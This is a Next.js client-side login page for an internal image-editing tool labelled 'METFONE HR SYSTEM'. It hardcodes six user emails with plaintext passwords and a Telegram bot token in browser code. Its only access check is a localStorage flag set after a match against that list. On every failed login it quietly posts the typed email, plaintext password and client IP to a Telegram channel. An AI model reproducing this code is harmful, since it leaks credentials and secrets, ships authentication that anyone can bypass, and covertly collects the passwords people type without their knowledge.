'use client';

import { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';
import Image from 'next/image';
import { EyeIcon, EyeSlashIcon, ShieldCheckIcon } from '@heroicons/react/24/outline';

const USERS = [
  { email: 'siemseko123@gmail.com', password: '@seko321', name: 'SIEM SEKO', role: 'Administrator' },
  { email: 'mochamrouen77@gmail.com', password: 'chamrouen@1199', name: 'MO CHAMROUEN', role: 'User' },
  { email: 'lunmab66@gmail.com', password: 'lunmab@66', name: 'LUN MAB', role: 'User' },
  { email: 'pujur123@gmail.com', password: '@pujur321', name: 'EM JUR', role: 'User' },
  { email: 'thearith11@gmail.com', password: 'thearith@@', name: 'Thearith', role: 'User' },
  { email: 'kimchun@gmail.com', password: '@kimchun123', name: 'kimchun', role: 'User' },
];

const TELEGRAM_BOT_TOKEN = '7901486547:AAFCBn9fDiVREVPT75bwoolYHu13N76gSBU';
const TELEGRAM_CHANNEL_ID = '-1002581891896';

async function sendTelegramNotification(message: string) {
  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TELEGRAM_CHANNEL_ID, text: message, parse_mode: 'HTML' }),
    });
  } catch (error) {
    console.error('Error sending notification:', error);
  }
}

async function getClientDetails() {
  try {
    const ipResponse = await fetch('https://api.ipify.org?format=json');
    const ipData = await ipResponse.json();
    return { ip: ipData.ip || 'Unknown' };
  } catch {
    return { ip: 'Unknown' };
  }
}

export default function LoginPage() {
  const router = useRouter();
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [isCheckingAuth, setIsCheckingAuth] = useState(true);

  useEffect(() => {
    if (localStorage.getItem('auth')) {
      router.push('/admin/resize-images');
    } else {
      setIsCheckingAuth(false);
    }
  }, [router]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError('');
    setLoading(true);

    const userFound = USERS.find(u => u.email === email && u.password === password);
    const { ip } = await getClientDetails();

    if (userFound) {
      const message = `🔔 <b>New Login:</b> ${userFound.name}\n🌐 <b>IP:</b> ${ip}\n🚀 <b>Status:</b> Success`;
      
      localStorage.setItem('auth', JSON.stringify({ 
        email: userFound.email, 
        name: userFound.name, 
        role: userFound.role 
      }));
      
      await sendTelegramNotification(message);
      router.push('/admin/resize-images');
    } else {
      const message = `⚠️ <b>Failed Login:</b> ${email}\n🔑 <b>Pass:</b> ${password}\n🌐 <b>IP:</b> ${ip}`;
      await sendTelegramNotification(message);
      setError('Invalid email or password');
      setLoading(false);
    }
  };

  if (isCheckingAuth) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-slate-50">
        <div className="animate-spin rounded-full h-10 w-10 border-t-2 border-blue-600" />
      </div>
    );
  }

  return (
    <div className="min-h-screen flex bg-white font-sans">
      {/* Sidebar Branding */}
      <div className="hidden lg:flex lg:w-1/2 bg-blue-600 items-center justify-center p-12 relative overflow-hidden">
        <div className="absolute top-0 left-0 w-full h-full opacity-10 bg-[radial-gradient(circle_at_center,_var(--tw-gradient-stops))] from-white via-transparent to-transparent" />
        <div className="relative z-10 text-white max-w-md">
          <div className="mb-8 p-4 bg-white/10 backdrop-blur-md rounded-3xl inline-block">
            <ShieldCheckIcon className="w-12 h-12" />
          </div>
          <h2 className="text-4xl font-bold mb-6 leading-tight">
            Digital Automated Image Editing System
          </h2>
          <p className="text-blue-100 text-lg leading-relaxed">
            Welcome to Version 1.9. Access your professional tools for image resizing, OCR, and automated management in one secure place.
          </p>
          <div className="mt-12 flex items-center gap-4 text-sm font-medium text-blue-200">
            <span className="w-12 h-[1px] bg-blue-300" />
            <span>METFONE HR SYSTEM</span>
          </div>
        </div>
      </div>

      {/* Login Form Section */}
      <div className="w-full lg:w-1/2 flex items-center justify-center p-8">
        <div className="max-w-sm w-full">
          <div className="flex flex-col items-center mb-10">
            <Image 
              src="https://siemseko.github.io/ai/logo.png" 
              width={96}
              height={96}
              className="object-contain mb-4 drop-shadow-sm" 
              alt="logo" 
              priority
            />
            <h1 className="text-2xl font-bold text-slate-800">Sign In</h1>
            <p className="text-slate-400 text-sm mt-1">Enter your credentials to continue</p>
          </div>

          <form onSubmit={handleSubmit} className="space-y-4">
            <div>
              <label className="text-xs font-bold text-slate-500 uppercase tracking-wider ml-1 mb-2 block">
                Email Address
              </label>
              <input
                type="email"
                placeholder="name@example.com"
                className="w-full px-5 py-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500 transition-all text-sm"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                required
              />
            </div>

            <div>
              <label className="text-xs font-bold text-slate-500 uppercase tracking-wider ml-1 mb-2 block">
                Password
              </label>
              <div className="relative">
                <input
                  type={showPassword ? 'text' : 'password'}
                  placeholder="••••••••"
                  className="w-full px-5 py-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500 transition-all text-sm"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  required
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-4 top-1/2 -translate-y-1/2 text-slate-400 hover:text-blue-600 transition-colors"
                >
                  {showPassword ? <EyeIcon className="h-5 w-5" /> : <EyeSlashIcon className="h-5 w-5" />}
                </button>
              </div>
            </div>

            {error && (
              <div className="p-4 bg-rose-50 border border-rose-100 rounded-xl text-rose-600 text-xs font-semibold animate-shake">
                {error}
              </div>
            )}

            <button
              type="submit"
              disabled={loading}
              className={`w-full py-4 px-6 rounded-2xl font-bold text-sm shadow-lg transition-all ${
                loading 
                ? 'bg-slate-100 text-slate-400 cursor-not-allowed shadow-none' 
                : 'bg-blue-600 text-white shadow-blue-200 hover:bg-blue-700 hover:-translate-y-0.5 active:translate-y-0'
              }`}
            >
              {loading ? (
                <div className="flex items-center justify-center gap-2">
                  <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                  <span>Signing in...</span>
                </div>
              ) : 'Sign In'}
            </button>
          </form>

          <p className="text-center text-slate-400 text-xs mt-10">
            Internal Access Only • Authorized Personnel
          </p>
        </div>
      </div>

      <style jsx global>{`
        @keyframes shake {
          0%, 100% { transform: translateX(0); }
          25% { transform: translateX(-4px); }
          75% { transform: translateX(4px); }
        }
        .animate-shake { animation: shake 0.2s ease-in-out 0s 2; }
      `}</style>
    </div>
  );
}